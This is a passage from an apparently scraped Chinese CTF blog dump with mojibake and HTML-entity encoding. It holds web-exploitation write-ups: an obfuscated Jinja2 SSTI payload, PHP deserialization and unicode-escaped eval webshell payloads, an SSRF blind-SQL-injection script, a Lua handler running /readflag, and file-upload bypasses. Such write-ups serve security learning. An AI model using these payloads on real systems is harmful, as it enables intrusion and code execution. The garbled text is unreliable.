shiba&#x3D;five*five-three-three-one %&#125;&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb&#x3D;(xiahuaxian,xiahuaxian,dict(glob&#x3D;a,als&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set bin&#x3D;(xiahuaxian,xiahuaxian,dict(builtins&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set chcr&#x3D;(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set xiegang&#x3D;chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;&#123;% set space&#x3D;chcr(three*three*five-five-five-three) %&#125;&#123;% set shell&#x3D;(ls,space,xiegang,dict(var&#x3D;a)|join,xiegang,dict(www&#x3D;a)|join,xiegang,dict(flask&#x3D;a)|join)|join %&#125;&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;æ„Ÿè§‰fengå¸ˆå‚…è¿™ä¸ªæ¯”è¾ƒåƒé¢„æœŸè§£ è¿™ç¯‡ç¾½å¸ˆå‚…-SSTI æ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰æ€»ç»“çš„å¾ˆå…¨é¢ å‚è€ƒhttps://blog.csdn.net/rfrder/article/details/115272645 &gt; https://shimo.im/docs/lf9OcEmdH70MC17f/read 3.ez_serialize SPL æ˜¯ä»€ä¹ˆï¼Ÿé¡¾åæ€ä¹‰ï¼ŒSPL å°±æ˜¯ Standard PHP Library çš„ç¼©å†™ã€‚æ®æ‰‹å†Œæ˜¾ç¤ºï¼ŒSPL æ˜¯ç”¨äºè§£å†³å…¸å‹é—®é¢˜(standard problems)çš„ä¸€ç»„æ¥å£ä¸ç±»çš„é›†åˆã€‚æ‰“å¼€æ‰‹å†Œï¼Œæ­£å¦‚ä¸Šé¢çš„å®šä¹‰ä¸€æ ·ï¼Œæœ‰è®¸å¤šå°è£…å¥½çš„ç±»ã€‚å› ä¸ºæ˜¯è¦è§£å†³å…¸å‹é—®é¢˜ï¼Œå…ä¸äº†æœ‰ä¸€äº›å¤„ç†æ–‡ä»¶çš„ç±»ã€‚ SLP ç±»ä¸­å­˜åœ¨èƒ½å¤Ÿè¿›è¡Œæ–‡ä»¶å¤„ç†å’Œè¿­ä»£çš„ç±»ï¼š ç±» æè¿°DirectoryIterator| éå†ç›®å½•FilesystemIterator | éå†ç›®å½•GlobIterator éå†ç›®å½•ï¼Œä½†æ˜¯ä¸åŒçš„ç‚¹åœ¨äºå®ƒå¯ä»¥é€šé…ä¾‹å¦‚/var/html/www/flag*SplFileObject è¯»å–æ–‡ä»¶ï¼ŒæŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå†finfo/finfo_open() éœ€è¦ä¸¤ä¸ªå‚æ•°æºç ï¼š åˆ¤æ–­äº†ç»™å‡ºçš„ Aã€Bã€C ä¸‰ä¸ªç±»éƒ½æ²¡æœ‰ä»€ä¹ˆå±é™©å‡½æ•°ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰åˆ©ç”¨çš„ç‚¹ï¼Œæƒ³åˆ°åº”è¯¥æ˜¯åŸç”Ÿç±»çš„åˆ©ç”¨ã€‚ æºç  ç›´æ¥è¯»å–/var/www/html ä¸‹æ–‡ä»¶æœ‰å“ªäº›,å¾—åˆ°ä¸€ä¸ª flag æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œå†éå†è¿™ä¸ªæ–‡ä»¶å¤¹å‘ç°å­˜åœ¨ flag.php 12345678&lt;?phpclass A&#123; public $class=&#x27;FilesystemIterator&#x27;; public $para=&quot;/var/www/html&quot;; public $check; &#125;$o = new A();echo serialize($o); å¾—åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125;å›æ˜¾ html ä¸‹çš„æ–‡ä»¶å¤¹ 1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE è¯»å– flag 123456789&lt;?phpclass A&#123; public $class=&#x27;SplFileObject&#x27;; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; &#125;$o = new A();echo serialize($o); åºåˆ—åŒ–å­—ç¬¦ä¸²O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:55:&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125; å‚è€ƒhttp://www.plasf.cn/articles/dasctf202103.html 4.ez_login https://www.freebuf.com/news/202819.html è€ƒç‚¹:SSRF å’Œ session ç»•è¿‡ç¬¬ä¸€ç‚¹ç»•è¿‡ SESSION åªéœ€è¦ PHP_SESSION_UPLOAD_PROGRESS å°±å®Œäº‹äº†ã€‚æ³¨å…¥ Boo äº†ç›²æ³¨ï¼Œ SSRF å’Œ session ç»•è¿‡ ç»™äº†æºç  12345678910111213141516171819202122232425Index.php&lt;?php if(!isset($_SESSION))&#123; highlight_file(__FILE__); die(&quot;no session&quot;); &#125; include(&quot;./php/check_ip.php&quot;); error_reporting(0); $url = $_GET[&#x27;url&#x27;]; if(check_inner_ip($url))&#123; if($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); $output = curl_exec($ch); $result_info = curl_getinfo($ch); curl_close($ch); &#125; &#125;else&#123; echo &quot;Your IP is internal yoyoyo&quot;; &#125;?&gt; se1f_log3n.php 1234567891011121314151617&lt;?phpinclude(&quot;./php/db.php&quot;);include(&quot;./php/check_ip.php&quot;);error_reporting(E_ALL);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];if($ip !== &quot;127.0.0.1&quot;)&#123; exit();&#125;else&#123; try&#123; $sql = &#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;.$username.&#x27;&quot; and `password`=&quot;&#x27;.$password.&#x27;&quot;;&#x27;; $result = $con-&gt;query($sql); echo $sql; &#125;catch(Exception $e)&#123; echo $e-&gt;getMessage(); &#125; ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die(&#x27;Try again!&#x27;) ));&#125; å¤§ä½¬è„šæœ¬ 1234567891011121314151617# coding=utf-8import ioimport requestsimport threadingtables = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;flag = &#x27;&#x27;sessid = &#x27;flag&#x27;for i in range(1,70): for j in tables: url = &quot;http://6ac49c07-405e-454b-8b76-50c4b3adb45d.machine.dasctf.com/?url=http://localhost/se1f_Log3n.php?username=admin&#x27; password regexp binary %s-- #&amp;password=admin&quot;%(j) f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) session = requests.session() resp = session.post(url,data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;x&#x27;&#125;,files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;, f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;) if &#x27;wrong&#x27; not in resp.text: flag = flag +j print(j) å¤ç°é—®é¢˜ï¼š å¤§ä½¬çš„è„šæœ¬å¥½åƒå‡ºäº†ç‚¹é—®é¢˜ï¼Œä¸‹æ¬¡å†å†™å§","categories":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"2020è¥¿æ¹–è®ºå‰‘-webå¤ç°","slug":"CTFæ¯”èµ›/2020è¥¿æ¹–è®ºå‰‘/2020è¥¿æ¹–è®ºå‰‘","date":"2021-04-02T08:06:06.000Z","updated":"2021-05-19T12:51:06.003Z","comments":true,"path":"2021/04/02/CTFæ¯”èµ›/2020è¥¿æ¹–è®ºå‰‘/2020è¥¿æ¹–è®ºå‰‘/","link":"","permalink":"http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/","excerpt":"","text":"2020 è¥¿æ¹–è®ºå‰‘å‰è¨€è®°å¾—å½“æ—¶ç¬¬ä¸€æ¬¡å‚åŠ æ¯”èµ›ï¼Œè™çš„å¥½æƒ¨ï¼Œé¢˜ç›®å¾ˆå¥½ï¼Œç½‘é€Ÿå¾ˆå¿«ï¼Œå°±æ˜¯åšä¸å‡ºï¼Œå…¨ç¨‹å‡‘æ•°ï¼Œæ–°æ‰‹æ‘çš„æˆ‘åˆšå‡ºé—¨å°±ç›´æ¥é¢å¯¹ç™¾çº§ bossï¼Œæ²¡æœ‰ä»»ä½•æ¸¸æˆä½“éªŒã€‚é‡æ–°å¼€å§‹ï¼Œä»Šå¹´ç»§ç»­ 1.NewUload æ–‡ä»¶ä¸Šä¼ ï¼Œè¿‡æ»¤äº†æ–‡ä»¶åç¼€åå’Œæ–‡ä»¶å†…å®¹éƒ½è¿‡æ»¤äº† php å…³é”®å­—ï¼Œç”šè‡³çŸ­æ ‡ç­¾çš„å°–æ‹¬å·éƒ½ä¸è¡Œï¼Œä½†æ˜¯ï¼Œæ²¡æƒ³åˆ°å±…ç„¶å¯ä»¥é€šè¿‡æ¢è¡Œæ¥ç»•è¿‡åç¼€åæ£€æµ‹å’Œç”¨å›¾ç‰‡é©¬æ¥ç»•è¿‡æ–‡ä»¶å†…å®¹çš„æ£€æµ‹ã€‚ å°±èƒ½ä» phpinfo ä¸­å‘ç° disable_functions ä¸­ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ã€‚ç½‘ä¸Šæœ‰ä¸¤ç§æ–¹æ³• ç¬¬ä¸€ç§å°±æ˜¯åˆ©ç”¨.htaccess+luaã€‚lua æ˜¯ä¹Ÿæ˜¯ä¸€ç§è½»é‡åŒ–è„šæœ¬è¯­è¨€ï¼Œåœ¨ PHP ç¯å¢ƒä¸­å¯ä»¥è¢«è§£æ å…ˆä¸Šä¼ ä¸€ä¸ª.htaccess æ–‡ä»¶ï¼Œä½œç”¨æ˜¯ä½¿ lua æ–‡ä»¶è§£æç”Ÿæ•ˆã€‚ 12.htaccesAddHandler lua-script .lua ç„¶åä¸Šä¼ ä¸€ä¸ª 1.lua æ–‡ä»¶ï¼Œå†è®¿é—® 1.lua å°±èƒ½æˆåŠŸå¾—åˆ° flagã€‚ 1234567891011121314151617181920212223--[1.lua --]require &quot;string&quot;--[[ This is the default method name for Lua handlers, see the optional function-name in the LuaMapHandler directive to choose a different entry point.--]]function handle(r) r.content_type = &quot;text/plain&quot; r:puts(&quot;Hello Lua World!\\n&quot;) local t = io.popen(&#x27;/readflag&#x27;) local a = t:read(&quot;*all&quot;) r:puts(a) if r.method == &#x27;GET&#x27; then for k, v in pairs( r:parseargs() ) do r:puts( string.format(&quot;%s: %s\\n&quot;, k, v) ) end else r:puts(&quot;Unsupported HTTP method &quot; .. r.method) endend ç¬¬äºŒç§æ–¹æ³•æ˜¯å¼¹ shellï¼Œä½†æ˜¯æ–¹æ³•å¾ˆå¤æ‚ï¼Œæœ‰ç‚¹éš¾æ‡‚ï¼Œå‚è€ƒå¤§ä½¬æ–‡ç«  å‚è€ƒhttps://blog.csdn.net/tm_1024/article/details/109056127 2.EasyJson è¿™é¢˜æ€»çš„æ¥è¯´å°±æ˜¯ä»£ç å®¡è®¡+ï¼ˆä¼ªï¼‰æ–‡ä»¶ä¸Šä¼ +RCE, ä¸»è¦è€ƒç‚¹å°±æ˜¯ç»•è¿‡ json æ ¼å¼ æºç  1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &#x27;security.php&#x27;;if(!isset($_GET[&#x27;source&#x27;]))&#123; show_source(__FILE__); die();&#125;$sandbox = &#x27;sandbox/&#x27;.sha1($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]).&#x27;/&#x27;;//è®¾ç½®æ²™ç›’æ ¹æ®è‡ªå·±ipè·å¾—ç›®å½•var_dump($sandbox);if(!file_exists($sandbox))&#123;//å¦‚æœä¸å­˜åœ¨å°±åˆ›å»º mkdir($sandbox); file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;);&#125;$action = $_GET[&#x27;action&#x27;];$content = file_get_contents(&quot;php://input&quot;);//è·å¾—postæ•°æ®æµif($action == &quot;write&quot; &amp;&amp; SecurityCheck(&#x27;filename&#x27;,$_GET[&#x27;filename&#x27;]) &amp;&amp;SecurityCheck(&#x27;content&#x27;,$content))&#123;//éªŒè¯å‡½æ•° $content = json_decode($content);//jsonæ ¼å¼è§£å¯† $filename = $_GET[&#x27;filename&#x27;]; $filecontent = $content-&gt;content;//è·å¾—contentå˜é‡çš„å€¼ $filename = $sandbox.$filename; file_put_contents($filename,$filecontent.&quot;\\n Powered By Dbapp OSS.&quot;);//å†™å…¥æ–‡ä»¶ï¼Œåˆ©ç”¨ç‚¹&#125;elseif($action == &quot;reset&quot;)&#123;//åˆ é™¤æ“ä½œ $files = scandir($sandbox); foreach($files as $file) &#123; if(!is_dir($file))&#123; if($file !== &quot;index.php&quot;)&#123; unlink($sandbox.$file); &#125; &#125; &#125;&#125;else&#123; die(&#x27;Security Check Failed.&#x27;);&#125; get è¦ä¼ å…¥ action,filename å’Œ source è¿™ä¸‰ä¸ªå‚æ•°ã€‚source æ˜¯ä¿è¯ä¸‹é¢çš„ php å‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œaction æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„æ“ä½œï¼Œè‚¯å®šæ˜¯ write äº†ã€‚filename æ˜¯æˆ‘ä»¬è¦å†™çš„æ–‡ä»¶çš„åå­—ã€‚post è¦ä¼ å…¥ json æ ¼å¼çš„å‚æ•°ï¼Œå®ƒçš„ content é”®çš„å€¼æ˜¯æˆ‘ä»¬è¦å†™å…¥æ–‡ä»¶çš„å†…å®¹ã€‚å®¡æ¸…æ¥šè¿™äº›ï¼Œåº”è¯¥åšçš„å°±æ˜¯å†™ä¸€ä¸ªå¯ä»¥ RCE çš„æ–‡ä»¶ï¼Œå› ä¸ºæˆ‘ä»¬å†™çš„æ–‡ä»¶çš„ç›®å½•å·²çŸ¥ï¼Œæ–‡ä»¶åå·²çŸ¥ï¼Œç„¶åå†è¯»å–é‚£ä¸ªæ–‡ä»¶ï¼Œç”¨èšå‰‘è¿æˆ–è€…è¿›è¡Œ RCEã€‚ ç¬¬ä¸€ä¸ªç»•è¿‡ç‚¹æ˜¯æ–‡ä»¶åã€‚å› ä¸ºä¹ æƒ¯æ€§ç»™æ–‡ä»¶å‘½å 1.phpï¼Œåœ¨è¿™é‡Œç›´æ¥æ²¡é€šè¿‡é‚£ä¸ªå®‰å…¨æ£€æµ‹äº†ã€‚æˆ‘ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯åç¼€ php è¢«è¿‡æ»¤ï¼Œåæ¥æˆ‘æŠŠåç¼€å»æ‰å‘ç°è¿˜æ˜¯è¢«é˜»äº†ï¼Œç„¶åæˆ‘æŠŠæ–‡ä»¶æ”¹æˆäº† feng.php å°±å¥½äº†ï¼Œæ‰å‘ç°åªæœ‰å­—æ¯ç»™æ–‡ä»¶å‘½åæ‰è¡Œã€‚æ¥ä¸‹æ¥å°±æ˜¯ post ä¼ å…¥çš„å‚æ•°äº†ã€‚post ä¼ å…¥åèµ‹ç»™å˜é‡$contentï¼Œä½†æ˜¯$content è¦è¢« json_decode ä¸€æ¬¡ã€‚æˆ‘ä¸€å¼€å§‹å°è¯•è¿™æ ·å†™&#123;&quot;content&quot;:&quot;&lt;?php eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;,å‘ç°çˆ† check failã€‚æˆ‘å°è¯•äº†å¤§å°å†™åŒå†™ç»•è¿‡åè¿˜æ˜¯ä¸è¡Œï¼Œç„¶åå°±å¡ä½äº†ã€‚ã€‚å› ä¸ºçœŸçš„å¯¹ json è¿™ä¸ªå†…å®¹ä¸å¤ªäº†è§£ã€‚ çœ‹äº† WPï¼ŒåŸæ¥ content é‡Œçš„ on ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚è¿™æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ã€‚æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå°è¯•ç”¨ unicode ç¼–ç æ¥ç»•è¿‡ã€‚åŸç†å¯ä»¥å‚è€ƒä¸‹é¢æ–‡ç« ï¼šæµ…è°ˆ json å‚æ•°è§£æå¯¹ waf ç»•è¿‡çš„å½±å“ è¢«è¿‡æ»¤çš„å…¨éƒ¨ä½¿ç”¨ Unicode ç¼–ç ä¹‹åå³å¯ï¼Œ&#123;&quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;&lt;?\\u0070\\u0068\\u0070 eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;å†è®¿é—®ä¸€ä¸‹http://easyjson.xhlj.wetolink.com/sandbox/9beb98a8de69744aec8456acc562a3685f92fabd/feng.phpç„¶åè¿›è¡Œ RCEã€‚é€šè¿‡æŸ¥çœ‹ phpinfoï¼Œå¯ä»¥å‘ç°è¿™é¢˜æ²¡æœ‰ä»»ä½•å‡½æ•°è¢«ç¦ç”¨ï¼Œå› æ­¤è·å– flag å°±ååˆ†å®¹æ˜“äº†ã€‚æ‰¾åˆ° security.php çš„æºç  123456789101112131415161718192021222324&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2020/2/7 * Time: 1:31 PM */function SecurityCheck($type,$content)&#123; switch ($type)&#123; case &#x27;filename&#x27;: if(preg_match(&quot;/[^a-z\\.]/&quot;, $content) !== 0) &#123; return false; &#125; return true; break; case &#x27;content&#x27;: if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;) || stristr($content,&#x27;php&#x27;) || stristr($content,&#x27;.&#x27;)) &#123; return false; &#125; return true; break; &#125;&#125; æ–‡ä»¶ååªèƒ½ a-z çš„å­—æ¯ï¼Œå¯¹äº post çš„å‚æ•°ï¼Œåˆ™è¿‡æ»¤äº† on,html,type,flag,upload,file,php å’Œ. å‚è€ƒhttps://blog.csdn.net/rfrder/article/details/109107736?https://blog.csdn.net/qq_46091464/article/details/108967312? 3.HardXssè¿™é¢˜è€ƒçš„æ˜¯ ServiceWorkerï¼Œ ç®€å•çš„è®²ï¼Œæ˜¯æµè§ˆå™¨åœ¨åå°ç‹¬ç«‹äºç½‘é¡µè¿è¡Œçš„è„šæœ¬ã€‚å¯ä»¥ç®€å•çš„è®¤ä¸ºæ˜¯ä¸€ä¸ªä»‹äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ï¼Œæœ€é‡è¦çš„ä½œç”¨ä¹‹ä¸€å°±æ˜¯ç¼“å­˜ç¦»çº¿èµ„æºã€‚ SW æä¾›äº†ä¸€ç»„ APIï¼Œèƒ½å¤Ÿæ‹¦æˆªå½“å‰ç«™ç‚¹äº§ç”Ÿ HTTP è¯·æ±‚ï¼Œè¿˜èƒ½æ§åˆ¶è¿”å›ç»“æœã€‚å› æ­¤ï¼ŒSW æ‹¦ä½è¯·æ±‚åï¼Œä½¿ç”¨ Cache Storage é‡Œçš„å†…å®¹è¿›è¡Œè¿”å›ï¼Œå°±å¯ä»¥å®ç°ç¦»çº¿ç¼“å­˜çš„åŠŸèƒ½ã€‚å½“ Cache Storage ä¸å­˜åœ¨è¯·æ±‚çš„èµ„æºæ—¶å†å‘æœåŠ¡å™¨è¯·æ±‚,cache.put å¯ä»¥é€‰æ‹©æ€§åœ°å°†è¯·æ±‚èµ„æºåŠ è½½åˆ° cache storage ä¸­ã€‚å¦‚æœä¸æ‰‹åŠ¨å–æ¶ˆå·²ç»æ³¨å†Œè¿‡çš„ sw æœåŠ¡,åˆ·æ–°/é‡æ–°æ‰“å¼€é¡µé¢éƒ½ä¼šå¯åŠ¨ç«™ç‚¹çš„ sw æœåŠ¡ï¼Œè¿™ä¸ºæˆ‘ä»¬æŒä¹…åŒ– XSS æä¾›äº†ä¸€å®šçš„æ¡ä»¶ã€‚ å·²ç»æ‰¾ä¸åˆ° writeup äº†â€¦.é‚£å°±è¿™æ ·å§ã€‚ğŸ˜…ğŸ¤“","categories":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"upload-labsé¶æœºç»ƒä¹ ","slug":"upload-labs/upload-labs","date":"2021-03-28T13:06:06.000Z","updated":"2021-04-23T15:27:01.847Z","comments":true,"path":"2021/03/28/upload-labs/upload-labs/","link":"","permalink":"http://example.com/2021/03/28/upload-labs/upload-labs/","excerpt":"","text":"ä¸€ã€åç¼€é»‘åå•ç»•è¿‡1.å‰ç«¯ JS ç»•è¿‡ å¯ä»¥ç›´æ¥æ›´æ”¹ js æºç ï¼Œå…è®¸ä¸Šä¼  PHP æ–‡ä»¶ ä¹Ÿå¯ä»¥ç›´æ¥åˆ é™¤ 2.åªéªŒè¯ Content-type123if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; å‰ç«¯æ²¡æœ‰è¿‡æ»¤ï¼Œburp æŠ“åŒ…ä¿®æ”¹ content-typeï¼Œç»•è¿‡å³å¯ã€‚ 3.åç¼€å-é»‘åå•ç»•è¿‡ æºç  1234567891011121314151617181920212223if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; ä¸å¾—ä¸æ‰¿è®¤ï¼Œè¿™æ³¢é»‘åå•æå¾—æˆ‘æœ‰ç‚¹å¤´ç—›ã€‚ã€‚ æ–°çŸ¥è¯†å­¦ä¹  1234ç”¨é»‘åå•ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€çš„æ–‡ä»¶ä½†å¯ä»¥ä¸Šä¼ .phtml .phps .php5 .phtå‰ææ˜¯apacheçš„httpd.confä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht å¯ä»¥åœ¨ apache çš„é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰æ‰¾åˆ°å‘€ï¼Œä½†æ˜¯å¥½åƒä¹Ÿå¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯è®¿é—®ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œè‡ªåŠ¨å°† php è„šæœ¬è¿›è¡Œäº† html æ³¨é‡Š,æ²¡æœ‰ä»»ä½•æ˜¾ç¤º 4.htaccess ç»•è¿‡ æºç  123456789if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º è¿‡æ»¤æ˜¯çœŸçš„å¤šã€‚ã€‚ã€‚ æ²¡æœ‰è¿‡æ»¤.htaccess,å¯ä»¥å°è¯•ä¸‹ 12&lt;FilesMatch â€œ4.jpgâ€&gt;SetHandler application&#x2F;x-httpd-php åˆ›å»ºä¸€ä¸ª.htaccess æ–‡ä»¶ï¼Œå†™å…¥ä»£ç (å†…å®¹ä¸ºå°† 4.jpg å½“åš php æ–‡ä»¶è§£æ)ä¸Šä¼ .htaccess æ–‡ä»¶ï¼Œå†ä¸Šä¼  4.jpg å›¾ç‰‡é©¬æ–‡ä»¶(é©¬æ–‡ä»¶æ˜¯é€šè¿‡å›¾ç‰‡å’Œ php ç»“åˆçš„) 5..user.ini ç»•è¿‡é»‘åå• ä¾ç„¶è¿‡æ»¤äº†å¾ˆå¤šï¼Œè¿‡æ»¤äº†.htaccess åç¼€ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ç‚¹.int æ–‡ä»¶ æ‰€ä»¥å¯ä»¥ä¸Šä¼ .user.ini æ–‡ä»¶å†…å®¹æ˜¯auto_prepend_file=test.jpgè®©æ‰€æœ‰ php æ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å« test.jpg æ–‡ä»¶ 6.åç¼€åå¤§å°å†™ç»•è¿‡ æ²¡æœ‰å¯¹åç¼€åé•œå¤§å°å†™è½¬åŒ–ã€‚ 7.ç©ºæ ¼ç»•è¿‡ æºç  12345678if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 